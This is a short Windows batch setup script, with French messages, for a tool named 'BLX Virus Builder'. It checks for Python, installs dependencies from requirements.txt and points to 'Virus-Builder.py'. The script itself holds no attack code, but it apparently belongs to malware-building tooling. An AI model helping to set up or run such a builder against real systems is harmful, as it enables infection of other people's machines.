@echo off
title BLX Virus Builder - Setup
echo.
echo ============================================
echo    BLX Virus Builder - Installation
echo ============================================
echo.

cd /d "%~dp0"

echo [1/2] Verification de Python...
python --version >nul 2>&1
if errorlevel 1 (
    echo [ERREUR] Python n'est pas installe ou pas dans le PATH.
    echo Installez Python depuis https://www.python.org/downloads/
    echo Cochez "Add Python to PATH" lors de l'installation.
    pause
    exit /b 1
)
python --version
echo.

echo [2/2] Installation des dependances...
echo.
python -m pip install --upgrade pip
python -m pip install -r requirements.txt

if errorlevel 1 (
    echo.
    echo [ERREUR] L'installation a echoue.
    pause
    exit /b 1
)

echo.
echo ============================================
echo    Installation terminee avec succes !
echo ============================================
echo.
echo Lancez le Virus Builder avec: run.bat
echo Ou directement: python Virus-Builder.py
echo.
pause
